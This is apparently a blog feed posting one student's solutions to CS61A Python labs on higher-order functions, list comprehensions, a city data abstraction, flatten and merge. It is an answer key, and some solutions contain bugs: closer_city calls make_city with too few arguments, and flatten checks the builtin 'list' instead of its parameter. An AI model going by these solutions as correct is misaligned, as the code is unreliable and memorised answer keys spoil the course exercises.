<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compose1</span><span class="params">(f, g)</span>:</span></span><br><span class="line">    <span class="string">"""Return the composition function which given x, computes f(g(x)).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_one = lambda x: x + 1        # adds one to x</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; square = lambda x: x**2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a1 = compose1(square, add_one)   # (x + 1)^2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a1(4)</span></span><br><span class="line"><span class="string">    25</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; mul_three = lambda x: x * 3      # multiplies 3 to x</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a2 = compose1(mul_three, a1)    # ((x + 1)^2) * 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a2(4)</span></span><br><span class="line"><span class="string">    75</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a2(5)</span></span><br><span class="line"><span class="string">    108</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: f(g(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">composite_identity</span><span class="params">(f, g)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Return a function with one parameter x that returns True if f(g(x)) is</span></span><br><span class="line"><span class="string">    equal to g(f(x)). You can assume the result of g(x) is a valid input for f</span></span><br><span class="line"><span class="string">    and vice versa.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_one = lambda x: x + 1        # adds one to x</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; square = lambda x: x**2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b1 = composite_identity(square, add_one)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b1(0)                            # (0 + 1)^2 == 0^2 + 1</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b1(4)                            # (4 + 1)^2 != 4^2 + 1</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: compose1(f, g)(x) == compose1(g, f)(x)</span><br><span class="line">    <span class="comment"># return lambda x: f(g(x)) == g(f(x))</span></span><br></pre></td></tr></table></figure>

<h1 id="Q7-Count-van-Count"><a href="#Q7-Count-van-Count" class="headerlink" title="Q7: Count van Count"></a>Q7: Count van Count</h1><p>Consider the following implementations of count_factors and count_primes:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_factors</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the number of positive factors that n has.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_factors(6)</span></span><br><span class="line"><span class="string">    4   # 1, 2, 3, 6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_factors(4)</span></span><br><span class="line"><span class="string">    3   # 1, 2, 4</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    i, count = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_primes</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the number of prime numbers up to and including n.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(6)</span></span><br><span class="line"><span class="string">    3   # 2, 3, 5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(13)</span></span><br><span class="line"><span class="string">    6   # 2, 3, 5, 7, 11, 13</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    i, count = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> is_prime(i):</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> count_factors(n) == <span class="number">2</span> <span class="comment"># only factors are 1 and n</span></span><br></pre></td></tr></table></figure>
<p>The implementations look quite similar! Generalize this logic by writing a function count_cond, which takes in a two-argument predicate function condition(n, i). count_cond returns a one-argument function that counts all the numbers from 1 to n that satisfy condition.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_cond</span><span class="params">(condition)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a function with one parameter N that counts all the numbers from</span></span><br><span class="line"><span class="string">    1 to N that satisfy the two-argument predicate function Condition, where</span></span><br><span class="line"><span class="string">    the first argument for Condition is N and the second argument is the</span></span><br><span class="line"><span class="string">    number from 1 to N.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_factors = count_cond(lambda n, i: n % i == 0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_factors(2)   # 1, 2</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_factors(4)   # 1, 2, 4</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_factors(12)  # 1, 2, 3, 4, 6, 12</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_prime = lambda n, i: count_factors(i) == 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes = count_cond(is_prime)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(2)    # 2</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(3)    # 2, 3</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(4)    # 2, 3</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(5)    # 2, 3, 5</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_primes(20)   # 2, 3, 5, 7, 11, 13, 17, 19</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">count_func</span><span class="params">(n)</span>:</span></span><br><span class="line">        i, count = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">            <span class="keyword">if</span> condition(n, i):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line">    <span class="keyword">return</span> count_func</span><br></pre></td></tr></table></figure>

<h1 id="Q8-I-Heard-You-Liked-Functions…"><a href="#Q8-I-Heard-You-Liked-Functions…" class="headerlink" title="Q8: I Heard You Liked Functions…"></a>Q8: I Heard You Liked Functions…</h1><p>Define a function cycle that takes in three functions f1, f2, f3, as arguments. cycle will return another function that should take in an integer argument n and return another function. That final function should take in an argument x and cycle through applying f1, f2, and f3 to x, depending on what n was. Here’s what the final function should do to x for a few values of n:</p>
<ul>
<li>n = 0, return x</li>
<li>n = 1, apply f1 to x, or return f1(x)</li>
<li>n = 2, apply f1 to x and then f2 to the result of that, or return f2(f1(x))</li>
<li>n = 3, apply f1 to x, f2 to the result of applying f1, and then f3 to the result of applying f2, or f3(f2(f1(x)))</li>
<li>n = 4, start the cycle again applying f1, then f2, then f3, then f1 again, or f1(f3(f2(f1(x))))<br>And so forth.<br>Hint: most of the work goes inside the most nested function.</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span><span class="params">(f1, f2, f3)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a function that is itself a higher-order function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def add1(x):</span></span><br><span class="line"><span class="string">    ...     return x + 1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def times2(x):</span></span><br><span class="line"><span class="string">    ...     return x * 2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def add3(x):</span></span><br><span class="line"><span class="string">    ...     return x + 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; my_cycle = cycle(add1, times2, add3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; identity = my_cycle(0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; identity(5)</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_one_then_double = my_cycle(2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_one_then_double(1)</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; do_all_functions = my_cycle(3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; do_all_functions(2)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; do_more_than_a_cycle = my_cycle(4)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; do_more_than_a_cycle(2)</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; do_two_cycles = my_cycle(6)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; do_two_cycles(1)</span></span><br><span class="line"><span class="string">    19</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">h</span><span class="params">(x)</span>:</span></span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; n:</span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                    x = f1(x)</span><br><span class="line">                <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">                    x = f2(x)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    x = f3(x)</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">return</span> h</span><br><span class="line">    <span class="keyword">return</span> g</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab04</title>
    <url>/2018/10/08/cs61a-lab04/</url>
    <content><![CDATA[<h2 id="Q1-List-Indexing"><a href="#Q1-List-Indexing" class="headerlink" title="Q1: List Indexing"></a>Q1: List Indexing</h2><p>For each of the following lists, what is the list indexing expression that evaluates to 7? For example, if x = [7], then the answer would be x[0]. You can use the interpreter or Python Tutor to experiment with your answers.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x &#x3D; [1, 3, [5, 7], 9]</span><br><span class="line">x[2][1]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; x &#x3D; [[7]]</span><br><span class="line">x[0][0]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; x &#x3D; [3, 2, 1, [9, 8, 7]]</span><br><span class="line">x[3][2]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; x &#x3D; [[3, [5, 7], 9]]</span><br><span class="line">x[0][1][1]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>What would Python display? If you get stuck, try it out in the Python interpreter!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; lst &#x3D; [3, 2, 7, [84, 83, 82]]</span><br><span class="line">&gt;&gt;&gt; lst[4]</span><br><span class="line">Error</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; lst[3][0]</span><br><span class="line">84</span><br></pre></td></tr></table></figure>
<h2 id="Q2-WWPD-Lists"><a href="#Q2-WWPD-Lists" class="headerlink" title="Q2: WWPD: Lists?"></a>Q2: WWPD: Lists?</h2><p>What would Python display? Try to figure it out before you type it into the interpreter!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [x*x for x in range(5)]</span><br><span class="line">[0, 1, 4, 9, 16]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [n for n in range(10) if n % 2 &#x3D;&#x3D; 0]</span><br><span class="line">[0, 2, 4, 6, 8]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ones &#x3D; [1 for i in [&quot;hi&quot;, &quot;bye&quot;, &quot;you&quot;]]</span><br><span class="line">&gt;&gt;&gt; ones + [str(i) for i in [6, 3, 8, 4]]</span><br><span class="line">[1, 1, 1, &#39;6&#39;, &#39;3&#39;, &#39;8&#39;, &#39;4&#39;]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [i+5 for i in [n for n in range(1,4)]]</span><br><span class="line">[6, 7, 8]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [i**2 for i in range(10) if i &lt; 3]</span><br><span class="line">[0, 1, 4]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; lst &#x3D; [&#39;hi&#39; for i in [1, 2, 3]]</span><br><span class="line">&gt;&gt;&gt; print(lst)</span><br><span class="line">[&#39;hi&#39;, &#39;hi&#39;, &#39;hi&#39;]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; lst + [i for i in [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]]</span><br><span class="line">[&#39;hi&#39;, &#39;hi&#39;, &#39;hi&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;]</span><br></pre></td></tr></table></figure>
<h2 id="Q3-If-This-Not-That"><a href="#Q3-If-This-Not-That" class="headerlink" title="Q3: If This Not That"></a>Q3: If This Not That</h2><p>Define if_this_not_that, which takes a list of integers i_list and an integer this. For each element in i_list, if the element is larger than this, then print the element. Otherwise, print “that”.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">if_this_not_that</span><span class="params">(i_list, this)</span>:</span></span><br><span class="line">    <span class="string">"""Define a function which takes a list of integers `i_list` and an integer</span></span><br><span class="line"><span class="string">    `this`. For each element in `i_list`, print the element if it is larger</span></span><br><span class="line"><span class="string">    than `this`; otherwise, print the word "that".</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; original_list = [1, 2, 3, 4, 5]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_this_not_that(original_list, 3)</span></span><br><span class="line"><span class="string">    that</span></span><br><span class="line"><span class="string">    that</span></span><br><span class="line"><span class="string">    that</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> elem <span class="keyword">in</span> i_list:</span><br><span class="line">        <span class="keyword">if</span> elem &lt;= this:</span><br><span class="line">            print(<span class="string">"that"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(elem)</span><br><span class="line"></span><br><span class="line"><span class="comment"># List comprehension version</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">if_this_not_that</span><span class="params">(i_list, this)</span>:</span></span><br><span class="line">    [print(i) <span class="keyword">if</span> i &gt; this <span class="keyword">else</span> print(<span class="string">'that'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> i_list]</span><br></pre></td></tr></table></figure>
<h1 id="City-Data-Abstraction"><a href="#City-Data-Abstraction" class="headerlink" title="City Data Abstraction"></a>City Data Abstraction</h1><p>Say we have an abstract data type for cities. A city has a name, a latitude coordinate, and a longitude coordinate.</p>
<p>Our ADT has one constructor:</p>
<ul>
<li><p><code>make_city(name, lat, lon)</code>: Creates a city object with the given name, latitude, and longitude.<br>We also have the following selectors in order to get the information for each city:</p>
</li>
<li><p><code>get_name(city)</code>: Returns the city’s name</p>
</li>
<li><p><code>get_lat(city)</code>: Returns the city’s latitude</p>
</li>
<li><p><code>get_lon(city)</code>: Returns the city’s longitude<br>Here is how we would use the constructor and selectors to create cities and extract their information:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; berkeley &#x3D; make_city(&#39;Berkeley&#39;, 122, 37)</span><br><span class="line">&gt;&gt;&gt; get_name(berkeley)</span><br><span class="line">&#39;Berkeley&#39;</span><br><span class="line">&gt;&gt;&gt; get_lat(berkeley)</span><br><span class="line">122</span><br><span class="line">&gt;&gt;&gt; new_york &#x3D; make_city(&#39;New York City&#39;, 74, 40)</span><br><span class="line">&gt;&gt;&gt; get_lon(new_york)</span><br><span class="line">40</span><br></pre></td></tr></table></figure>
<p>All of the selector and constructor functions can be found in <code>city.py</code>, if you are curious to see how they are implemented. However, the point of data abstraction is that we do not need to know how an abstract data type is implemented, but rather just how we can interact with and use the data type.</p>
</li>
</ul>
<h2 id="Q4-Distance"><a href="#Q4-Distance" class="headerlink" title="Q4: Distance"></a>Q4: Distance</h2><p>We will now implement the function <code>distance</code>, which computes the distance between two city objects. Recall that the distance between two coordinate pairs <code>(x1, y1)</code> and <code>(x2, y2)</code> can be found by calculating the <code>sqrt</code> of <code>(x1 - x2)**2 + (y1 - y2)**2</code>. We have already imported sqrt for your convenience. Use the latitude and longitude of a city as its coordinates; you’ll need to use the selectors to access this info!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">distance</span><span class="params">(city1, city2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; city1 = make_city('city1', 0, 1)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; city2 = make_city('city2', 0, 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; distance(city1, city2)</span></span><br><span class="line"><span class="string">    1.0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; city3 = make_city('city3', 6.5, 12)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; city4 = make_city('city4', 2.5, 15)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; distance(city3, city4)</span></span><br><span class="line"><span class="string">    5.0</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> sqrt((get_lat(city1) - get_lat(city2)) ** <span class="number">2</span> + (get_lon(city1) - get_lon(city2)) ** <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Q5-Closer-city"><a href="#Q5-Closer-city" class="headerlink" title="Q5: Closer city"></a>Q5: Closer city</h2><p>Next, implement <code>closer_city</code>, a function that takes a latitude, longitude, and two cities, and returns the name of the city that is relatively closer to the provided latitude and longitude.</p>
<p>You may only use the selectors and constructors introduced above and the <code>distance</code> function you just defined for this question.</p>
<p><em>Hint: How can use your distance function to find the distance between the given location and each of the given cities?</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closer_city</span><span class="params">(lat, lon, city1, city2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns the name of either city1 or city2, whichever is closest to</span></span><br><span class="line"><span class="string">    coordinate (lat, lon).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; berkeley = make_city('Berkeley', 37.87, 112.26)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; stanford = make_city('Stanford', 34.05, 118.25)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; closer_city(38.33, 121.44, berkeley, stanford)</span></span><br><span class="line"><span class="string">    'Stanford'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; bucharest = make_city('Bucharest', 44.43, 26.10)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; vienna = make_city('Vienna', 48.20, 16.37)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; closer_city(41.29, 174.78, bucharest, vienna)</span></span><br><span class="line"><span class="string">    'Bucharest'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    city3 = make_city(lat, lon)</span><br><span class="line">    <span class="keyword">if</span> distance(city3, city1) &gt; distance(city3, city2):</span><br><span class="line">        <span class="keyword">return</span> get_name(city2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> get_name(city1)</span><br></pre></td></tr></table></figure>

<h2 id="Q6-Don’t-violate-the-abstraction-barrier"><a href="#Q6-Don’t-violate-the-abstraction-barrier" class="headerlink" title="Q6: Don’t violate the abstraction barrier!"></a>Q6: Don’t violate the abstraction barrier!</h2><p>When writing functions that use an ADT, we should use the constructor(s) and selector(s) whenever possible instead of assuming the ADT’s implementation. Relying on a data abstraction’s underlying implementation is known as violating the abstraction barrier, and we never want to do this!</p>
<p>It’s possible that you passed the doctests for <code>distance</code> and <code>closer_city</code> even if you violated the abstraction barrier. To check whether or not you did so, uncomment the following lines in your <code>lab04.py</code> file:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make_city = lambda name, lat, lon: &#123; 'name': name, 'lat': lat, 'lon': lon &#125;</span></span><br><span class="line"><span class="comment"># get_name = lambda city: city['name']</span></span><br><span class="line"><span class="comment"># get_lat = lambda city: city['lat']</span></span><br><span class="line"><span class="comment"># get_lon = lambda city: city['lon']</span></span><br></pre></td></tr></table></figure>
<p>These statements change the implementation of the city ADT. The nature of the abstraction barrier guarantees that changing the implementation of an ADT shouldn’t affect the functionality of any programs that use that ADT, as long as the constructors and selectors were used properly.</p>
<p>Now, rerun your tests for distance and closer_city without changing any of your code:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 ok -q distance</span><br><span class="line">python3 ok -q closer_city</span><br></pre></td></tr></table></figure>
<p>If you’ve followed the rules and used the constructor and selectors when you should’ve, the doctests should still pass!</p>
<p>If you passed the Ok tests before uncommenting those lines but not afterward, the fix is simple! Just replace any code that violates the abstraction barrier, i.e. creating a city with a new list object or indexing into a city, with the appropriate constructor or selector.</p>
<p>Make sure that your functions pass the tests with both the first and the second implementations of the City ADT and that you understand why they should work for both before moving on.</p>
<h1 id="Optional-Questions"><a href="#Optional-Questions" class="headerlink" title="Optional Questions"></a>Optional Questions</h1><p>All these questions can be found in <code>lab04_extra.py</code></p>
<h2 id="Q7-Flatten"><a href="#Q7-Flatten" class="headerlink" title="Q7: Flatten"></a>Q7: Flatten</h2><p>Write a function <code>flatten</code> that takes a (possibly deep) list and “flattens” it. For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; lst &#x3D; [1, [[2], 3], 4, [5, 6]]</span><br><span class="line">&gt;&gt;&gt; flatten(lst)</span><br><span class="line">[1, 2, 3, 4, 5, 6]</span><br></pre></td></tr></table></figure>
<p>Hint: you can check if something is a list by using the built-in <code>type</code> function. For example,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; type(3) &#x3D;&#x3D; list</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; type([1, 2, 3]) &#x3D;&#x3D; list</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<p><span style="color:red">I think the question may be thought as only having 3 conditions. First, the lst is empty list, we can only return []. Second, the first element in lst is a list, then we need call flatten recursively to its first element and the rest of the list. Last, the first element in lst is not a list(aka. one item), then we simply concat the first element and the flattened rest of the list.</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a flattened version of lst.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; flatten([1, 2, 3])     # normal list</span></span><br><span class="line"><span class="string">    [1, 2, 3]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x = [1, [2, 3], 4]      # deep list</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; flatten(x)</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x = [[1, [1, 1]], 1, [1, 1]] # deep list</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; flatten(x)</span></span><br><span class="line"><span class="string">    [1, 1, 1, 1, 1, 1]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> list:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">elif</span> type(lst[<span class="number">0</span>]) == list:</span><br><span class="line">        <span class="keyword">return</span> flatten(lst[<span class="number">0</span>]) + flatten(lst[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [lst[<span class="number">0</span>]] + flatten(lst[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>

<h2 id="Q8-Merge"><a href="#Q8-Merge" class="headerlink" title="Q8: Merge"></a>Q8: Merge</h2><p>Write a function <code>merge</code> that takes 2 sorted lists <code>lst1</code> and <code>lst2</code>, and returns a new list that contains all the elements in the two lists in sorted order.<br><span style="color:red">This iterative style of this problem may be like this, which can be used to the merge process of mergesort algorithm. The main idea here is that keeping the two lists not empty, then we compare the first element of the two lists, and the compare result decides which one we choose to slice. When the loop ends, we must have one list emptyed, then simply concat the rest list to the new list.</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(lst1, lst2)</span>:</span></span><br><span class="line">    <span class="string">"""Merges two sorted lists.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([1, 3, 5], [2, 4, 6])</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4, 5, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([], [2, 4, 6])</span></span><br><span class="line"><span class="string">    [2, 4, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([1, 2, 3], [])</span></span><br><span class="line"><span class="string">    [1, 2, 3]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; merge([5, 7], [2, 4, 6])</span></span><br><span class="line"><span class="string">    [2, 4, 5, 6, 7]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    new = []</span><br><span class="line">    <span class="keyword">while</span> lst1 <span class="keyword">and</span> lst2:</span><br><span class="line">        <span class="keyword">if</span> lst1[<span class="number">0</span>] &lt; lst2[<span class="number">0</span>]:</span><br><span class="line">            new += [lst1[<span class="number">0</span>]]</span><br><span class="line">            lst1 = lst1[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new += [lst2[<span class="number">0</span>]]</span><br><span class="line">            lst2 = lst2[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">if</span> lst1:</span><br><span class="line">        <span class="keyword">return</span> new + lst1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> new + lst2</span><br></pre></td></tr></table></figure>
<p><span style="color:red">This main idea of recursion is like the flatten function. There’re basiclly 4 conditions(while the solution can be shrinked to 3 conditions in the PDF solution). First, lst1 is empty list, then we return lst2. Second, lst2 is empty, then we return lst1. The rest of recursion is comparing the first element of the lst1 and lst2, then according to the result, we recursively call the merge function.</span></p>
